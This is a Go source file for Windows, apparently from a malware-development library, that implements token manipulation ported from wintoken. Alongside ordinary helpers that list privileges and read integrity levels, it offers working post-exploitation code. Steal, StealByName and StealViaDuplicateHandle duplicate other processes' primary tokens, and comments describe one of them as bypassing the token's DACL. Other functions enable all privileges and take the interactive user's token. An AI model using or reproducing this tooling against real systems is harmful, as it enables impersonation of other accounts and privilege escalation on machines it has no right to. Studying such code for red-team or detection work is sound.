//go:build windows

// Package token provides Windows token manipulation utilities ported from
// github.com/FourCoreLabs/wintoken.
package token

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/process/enum"
	"github.com/oioio-space/maldev/win/api"
)

var (
	procLookupPrivilegeName        = api.Advapi32.NewProc("LookupPrivilegeNameW")
	procLookupPrivilegeDisplayName = api.Advapi32.NewProc("LookupPrivilegeDisplayNameW")
)

var (
	ErrNoActiveSession                      = errors.New("no active session found")
	ErrInvalidDuplicatedToken               = errors.New("invalid duplicated token")
	ErrOnlyPrimaryImpersonationTokenAllowed = errors.New("only primary or impersonation token types allowed")
	ErrNoPrivilegesSpecified                = errors.New("no privileges specified")
	ErrTokenClosed                          = errors.New("token has been closed")
)

type (
	Type   int
	privModType int
)

const (
	PrivDisable privModType = iota
	PrivEnable
	PrivRemove
)

// Token wraps a windows.Token with its type and exposes manipulation methods.
type Token struct {
	typ   Type
	token windows.Token
}

// TokenUserDetail exposes token user details.
type TokenUserDetail struct {
	Username       string
	Domain         string
	AccountType    uint32
	UserProfileDir string
	Environ        []string
}

func (t TokenUserDetail) String() string {
	return fmt.Sprintf("Username: %s, Domain: %s, Account Type: %d, UserProfileDir: %s",
		t.Username, t.Domain, t.AccountType, t.UserProfileDir)
}

// Privilege describes a single token privilege entry.
type Privilege struct {
	Name             string
	Description      string
	Enabled          bool
	EnabledByDefault bool
	Removed          bool
	UsedForAccess    bool
}

func (p Privilege) String() string {
	status := "Disabled"
	if p.Removed {
		status = "Removed"
	} else if p.Enabled {
		status = "Enabled"
	}
	return fmt.Sprintf("%s: %s", p.Name, status)
}

const (
	tokenUnknown Type = iota
	Primary
	Impersonation
	Linked
)

const (
	WTS_CURRENT_SERVER_HANDLE windows.Handle = 0
)

// New wraps an existing windows.Token so callers can use the package's
// manipulation methods.
func New(t windows.Token, typ Type) *Token {
	return &Token{token: t, typ: typ}
}

// Steal duplicates the primary token from a target process.
// This is the standard post-exploitation token theft: open the process,
// query its token, duplicate it as a primary token.
//
// Requires SeDebugPrivilege for SYSTEM-level processes.
//
// Example:
//
//	tok, err := token.Steal(targetPID)
//	defer tok.Close()
//	// Use tok to create processes as the stolen identity
func Steal(pid int) (*Token, error) {
	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
	if err != nil {
		return nil, fmt.Errorf("OpenProcess %d: %w", pid, err)
	}
	defer windows.CloseHandle(hProcess)

	var hToken windows.Token
	if err := windows.OpenProcessToken(hProcess, windows.TOKEN_DUPLICATE|windows.TOKEN_QUERY, &hToken); err != nil {
		return nil, fmt.Errorf("OpenProcessToken: %w", err)
	}

	var dupToken windows.Token
	err = windows.DuplicateTokenEx(hToken, windows.TOKEN_ALL_ACCESS,
		nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupToken)
	hToken.Close()
	if err != nil {
		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
	}

	return New(dupToken, Primary), nil
}

// StealViaDuplicateHandle steals a token from a remote process using the
// DuplicateHandle technique. Unlike Steal(), this bypasses the token's own
// DACL because it duplicates a handle from the remote process's handle table
// rather than opening the token directly.
//
// Requires PROCESS_DUP_HANDLE access on hProcess (typically obtained via
// PROCESS_ALL_ACCESS after privilege escalation).
//
// remoteTokenHandle is the handle value of a token inside the remote process.
// Use ntapi.FindHandleByType to discover it via system handle enumeration.
func StealViaDuplicateHandle(hProcess windows.Handle, remoteTokenHandle uintptr) (*Token, error) {
	var localHandle windows.Handle
	currentProcess, _ := windows.GetCurrentProcess()
	err := windows.DuplicateHandle(
		hProcess,
		windows.Handle(remoteTokenHandle),
		currentProcess,
		&localHandle,
		0,
		false,
		windows.DUPLICATE_SAME_ACCESS,
	)
	if err != nil {
		return nil, fmt.Errorf("DuplicateHandle: %w", err)
	}
	defer windows.CloseHandle(localHandle)

	var dupToken windows.Token
	err = windows.DuplicateTokenEx(
		windows.Token(localHandle),
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityImpersonation,
		windows.TokenPrimary,
		&dupToken,
	)
	if err != nil {
		return nil, fmt.Errorf("DuplicateTokenEx: %w", err)
	}

	return New(dupToken, Primary), nil
}

// StealByName finds a process by name and steals its token.
func StealByName(processName string) (*Token, error) {
	procs, err := enum.FindByName(processName)
	if err != nil || len(procs) == 0 {
		return nil, fmt.Errorf("process %q not found", processName)
	}
	return Steal(int(procs[0].PID))
}

// Token returns the underlying windows.Token.
func (t *Token) Token() windows.Token {
	return t.token
}

// Close closes the underlying token handle.
func (t *Token) Close() {
	windows.Close(windows.Handle(t.token))
	t.token = 0
}

// Detach transfers ownership of the underlying token handle to the caller
// and zeroes the internal field so Close() becomes a no-op. The caller is
// responsible for closing the returned handle.
func (t *Token) Detach() windows.Token {
	h := t.token
	t.token = 0
	return h
}

func (t *Token) errIfTokenClosed() error {
	if t.token == 0 {
		return ErrTokenClosed
	}
	return nil
}

func lookupPrivilegeNameByLUID(luid uint64) (string, string, error) {
	nameBuffer := make([]uint16, 256)
	nameBufferSize := uint32(len(nameBuffer))
	displayNameBuffer := make([]uint16, 256)
	displayNameBufferSize := uint32(len(displayNameBuffer))

	sysName, err := windows.UTF16PtrFromString("")
	if err != nil {
		return "", "", err
	}

	if r1, _, err := procLookupPrivilegeName.Call(
		uintptr(unsafe.Pointer(sysName)),
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&nameBufferSize)),
	); r1 == 0 {
		return "", "", err
	}

	var langID uint32
	if r1, _, err := procLookupPrivilegeDisplayName.Call(
		uintptr(unsafe.Pointer(sysName)),
		uintptr(unsafe.Pointer(&nameBuffer[0])),
		uintptr(unsafe.Pointer(&displayNameBuffer[0])),
		uintptr(unsafe.Pointer(&displayNameBufferSize)),
		uintptr(unsafe.Pointer(&langID)),
	); r1 == 0 {
		return "", "", err
	}

	return windows.UTF16ToString(nameBuffer), windows.UTF16ToString(displayNameBuffer), nil
}

// UserDetails returns the user details associated with the token.
func (t *Token) UserDetails() (TokenUserDetail, error) {
	uSid, err := t.token.GetTokenUser()
	if err != nil {
		return TokenUserDetail{}, err
	}
	user, domain, typ, err := uSid.User.Sid.LookupAccount("")
	if err != nil {
		return TokenUserDetail{}, err
	}
	uProfDir, err := t.token.GetUserProfileDirectory()
	if err != nil {
		return TokenUserDetail{}, err
	}
	env, err := t.token.Environ(false)
	if err != nil {
		return TokenUserDetail{}, err
	}
	return TokenUserDetail{
		Username:       user,
		Domain:         domain,
		AccountType:    typ,
		UserProfileDir: uProfDir,
		Environ:        env,
	}, nil
}

// Privileges lists all privileges held by the token.
func (t *Token) Privileges() ([]Privilege, error) {
	if err := t.errIfTokenClosed(); err != nil {
		return nil, err
	}

	n := uint32(0)
	windows.GetTokenInformation(t.token, windows.TokenPrivileges, nil, 0, &n)

	b := make([]byte, n)
	if err := windows.GetTokenInformation(t.token, windows.TokenPrivileges, &b[0], uint32(len(b)), &n); err != nil {
		return nil, err
	}

	privBuff := bytes.NewBuffer(b)

	var nPrivs uint32
	if err := binary.Read(privBuff, binary.LittleEndian, &nPrivs); err != nil {
		return nil, fmt.Errorf("cannot read number of privileges: %w", err)
	}

	privDetails := make([]Privilege, int(nPrivs))

	for i := 0; i < int(nPrivs); i++ {
		var (
			luid            uint64
			attributes      uint32
			currentPrivInfo Privilege
			err             error
		)

		if err = binary.Read(privBuff, binary.LittleEndian, &luid); err != nil {
			return nil, fmt.Errorf("cannot read LUID from buffer: %w", err)
		}

		if err = binary.Read(privBuff, binary.LittleEndian, &attributes); err != nil {
			return nil, fmt.Errorf("cannot read attributes from buffer: %w", err)
		}

		currentPrivInfo.Name, currentPrivInfo.Description, err = lookupPrivilegeNameByLUID(luid)
		if err != nil {
			return nil, fmt.Errorf("cannot get privilege info based on the LUID: %w", err)
		}

		currentPrivInfo.EnabledByDefault = (attributes & windows.SE_PRIVILEGE_ENABLED_BY_DEFAULT) > 0
		currentPrivInfo.UsedForAccess = (attributes & windows.SE_PRIVILEGE_USED_FOR_ACCESS) > 0
		currentPrivInfo.Enabled = (attributes & windows.SE_PRIVILEGE_ENABLED) > 0
		currentPrivInfo.Removed = (attributes & windows.SE_PRIVILEGE_REMOVED) > 0

		privDetails[i] = currentPrivInfo
	}

	return privDetails, nil
}

// EnableAllPrivileges enables all non-removed, currently disabled privileges.
func (t *Token) EnableAllPrivileges() error {
	if err := t.errIfTokenClosed(); err != nil {
		return err
	}

	privs, err := t.Privileges()
	if err != nil {
		return err
	}

	var toBeEnabled []string
	for _, p := range privs {
		if !p.Removed && !p.Enabled {
			toBeEnabled = append(toBeEnabled, p.Name)
		}
	}
	return t.modifyTokenPrivileges(toBeEnabled, PrivEnable)
}

// DisableAllPrivileges disables all currently enabled privileges.
func (t *Token) DisableAllPrivileges() error {
	if err := t.errIfTokenClosed(); err != nil {
		return err
	}

	privs, err := t.Privileges()
	if err != nil {
		return err
	}

	var toBeDisabled []string
	for _, p := range privs {
		if !p.Removed && p.Enabled {
			toBeDisabled = append(toBeDisabled, p.Name)
		}
	}
	return t.modifyTokenPrivileges(toBeDisabled, PrivDisable)
}

// RemoveAllPrivileges removes all non-removed privileges from the token.
func (t *Token) RemoveAllPrivileges() error {
	if err := t.errIfTokenClosed(); err != nil {
		return err
	}

	privs, err := t.Privileges()
	if err != nil {
		return err
	}

	var toBeRemoved []string
	for _, p := range privs {
		if !p.Removed {
			toBeRemoved = append(toBeRemoved, p.Name)
		}
	}
	return t.modifyTokenPrivileges(toBeRemoved, PrivRemove)
}

// EnablePrivileges enables the named privileges.
func (t *Token) EnablePrivileges(privs []string) error {
	return t.modifyTokenPrivileges(privs, PrivEnable)
}

// DisablePrivileges disables the named privileges.
func (t *Token) DisablePrivileges(privs []string) error {
	return t.modifyTokenPrivileges(privs, PrivDisable)
}

// RemovePrivileges removes the named privileges.
func (t *Token) RemovePrivileges(privs []string) error {
	return t.modifyTokenPrivileges(privs, PrivRemove)
}

// EnablePrivilege enables a single named privilege.
func (t *Token) EnablePrivilege(priv string) error {
	return t.modifyTokenPrivilege(priv, PrivEnable)
}

// DisablePrivilege disables a single named privilege.
func (t *Token) DisablePrivilege(priv string) error {
	return t.modifyTokenPrivilege(priv, PrivDisable)
}

// RemovePrivilege removes a single named privilege.
func (t *Token) RemovePrivilege(priv string) error {
	return t.modifyTokenPrivilege(priv, PrivRemove)
}

func (t *Token) modifyTokenPrivileges(privs []string, mode privModType) error {
	if err := t.errIfTokenClosed(); err != nil {
		return err
	}

	if len(privs) == 0 {
		return ErrNoPrivilegesSpecified
	}

	errMsgConst := ""
	switch mode {
	case PrivDisable:
		errMsgConst = "disabling"
	case PrivEnable:
		errMsgConst = "enabling"
	case PrivRemove:
		errMsgConst = "removing"
	}

	var errMsg string
	for _, p := range privs {
		if err := t.modifyTokenPrivilege(p, mode); err != nil {
			if len(errMsg) != 0 {
				errMsg += "\n"
			}
			errMsg += fmt.Sprintf("%s privilege for %s failed: %s", errMsgConst, p, err)
		}
	}

	if len(errMsg) != 0 {
		return errors.New(errMsg)
	}
	return nil
}

func (t *Token) modifyTokenPrivilege(priv string, mode privModType) error {
	if err := t.errIfTokenClosed(); err != nil {
		return err
	}

	var luid windows.LUID
	if err := windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr(priv), &luid); err != nil {
		return fmt.Errorf("LookupPrivilegeValueW failed: %w", err)
	}

	ap := windows.Tokenprivileges{
		PrivilegeCount: 1,
	}
	ap.Privileges[0].Luid = luid

	switch mode {
	case PrivEnable:
		ap.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED
	case PrivRemove:
		ap.Privileges[0].Attributes = windows.SE_PRIVILEGE_REMOVED
	}

	if err := windows.AdjustTokenPrivileges(t.token, false, &ap, 0, nil, nil); err != nil {
		return fmt.Errorf("AdjustTokenPrivileges failed: %w", err)
	}

	return nil
}

// IntegrityLevel returns the integrity level string of the token.
func (t *Token) IntegrityLevel() (string, error) {
	if err := t.errIfTokenClosed(); err != nil {
		return "", err
	}

	n := uint32(0)
	windows.GetTokenInformation(t.token, windows.TokenIntegrityLevel, nil, 0, &n)

	b := make([]byte, n)
	if err := windows.GetTokenInformation(t.token, windows.TokenIntegrityLevel, &b[0], uint32(len(b)), &n); err != nil {
		return "", err
	}

	tml := (*windows.Tokenmandatorylabel)(unsafe.Pointer(&b[0]))
	sid := (*windows.SID)(unsafe.Pointer(tml.Label.Sid))
	switch sid.String() {
	case "S-1-16-4096":
		return "Low", nil
	case "S-1-16-8192":
		return "Medium", nil
	case "S-1-16-12288":
		return "High", nil
	case "S-1-16-16384":
		return "System", nil
	default:
		return "Unknown", nil
	}
}

// LinkedToken returns the linked token if the token has one.
func (t *Token) LinkedToken() (*Token, error) {
	lt, err := t.token.GetLinkedToken()
	if err != nil {
		return nil, err
	}
	return &Token{typ: Linked, token: lt}, nil
}

// OpenProcessToken opens the token for a process identified by pid.
// Pass pid=0 to open the current process token.
func OpenProcessToken(pid int, typ Type) (*Token, error) {
	var (
		t               windows.Token
		duplicatedToken windows.Token
		procHandle      windows.Handle
		err             error
	)

	if pid == 0 {
		procHandle = windows.CurrentProcess()
	} else {
		procHandle, err = windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION, false, uint32(pid))
		if err != nil {
			return nil, err
		}
	}

	if err = windows.OpenProcessToken(procHandle, windows.TOKEN_ALL_ACCESS, &t); err != nil {
		return nil, err
	}
	defer windows.CloseHandle(windows.Handle(t))

	switch typ {
	case Primary:
		if err = windows.DuplicateTokenEx(t, windows.MAXIMUM_ALLOWED, nil, windows.SecurityDelegation, windows.TokenPrimary, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
	case Impersonation:
		if err = windows.DuplicateTokenEx(t, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
	case Linked:
		if err = windows.DuplicateTokenEx(t, windows.MAXIMUM_ALLOWED, nil, windows.SecurityDelegation, windows.TokenPrimary, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
		dt, err := duplicatedToken.GetLinkedToken()
		windows.CloseHandle(windows.Handle(duplicatedToken))
		if err != nil {
			return nil, fmt.Errorf("error while getting LinkedToken: %w", err)
		}
		duplicatedToken = dt
	}

	return &Token{token: duplicatedToken, typ: typ}, nil
}

// Interactive returns the interactive token for the currently logged-in
// user via WTSEnumerateSessions and WTSQueryUserToken.
func Interactive(typ Type) (*Token, error) {
	switch typ {
	case Primary, Impersonation, Linked:
	default:
		return nil, ErrOnlyPrimaryImpersonationTokenAllowed
	}

	var (
		sessionPointer   uintptr
		sessionCount     uint32
		interactiveToken windows.Token
		duplicatedToken  windows.Token
		sessionID        uint32
		found            bool
	)

	err := windows.WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, (**windows.WTS_SESSION_INFO)(unsafe.Pointer(&sessionPointer)), &sessionCount)
	if err != nil {
		return nil, fmt.Errorf("error while enumerating sessions: %v", err)
	}
	defer windows.WTSFreeMemory(sessionPointer)

	sessions := make([]*windows.WTS_SESSION_INFO, sessionCount)
	size := unsafe.Sizeof(windows.WTS_SESSION_INFO{})
	for i := range sessions {
		sessions[i] = (*windows.WTS_SESSION_INFO)(unsafe.Pointer(sessionPointer + (size * uintptr(i))))
	}

	for i := range sessions {
		if sessions[i].State == windows.WTSActive {
			sessionID = sessions[i].SessionID
			found = true
			break
		}
	}
	if !found {
		return nil, ErrNoActiveSession
	}

	if err = windows.WTSQueryUserToken(sessionID, &interactiveToken); err != nil {
		return nil, fmt.Errorf("error while WTSQueryUserToken: %w", err)
	}
	defer windows.CloseHandle(windows.Handle(interactiveToken))

	switch typ {
	case Primary:
		if err = windows.DuplicateTokenEx(interactiveToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityDelegation, windows.TokenPrimary, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
	case Impersonation:
		if err = windows.DuplicateTokenEx(interactiveToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityImpersonation, windows.TokenImpersonation, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
	case Linked:
		if err = windows.DuplicateTokenEx(interactiveToken, windows.MAXIMUM_ALLOWED, nil, windows.SecurityDelegation, windows.TokenPrimary, &duplicatedToken); err != nil {
			return nil, fmt.Errorf("error while DuplicateTokenEx: %w", err)
		}
		dt, err := duplicatedToken.GetLinkedToken()
		windows.CloseHandle(windows.Handle(duplicatedToken))
		if err != nil {
			return nil, fmt.Errorf("error while getting LinkedToken: %w", err)
		}
		duplicatedToken = dt
	}

	if windows.Handle(duplicatedToken) == windows.InvalidHandle {
		return nil, ErrInvalidDuplicatedToken
	}

	return &Token{typ: typ, token: duplicatedToken}, nil
}
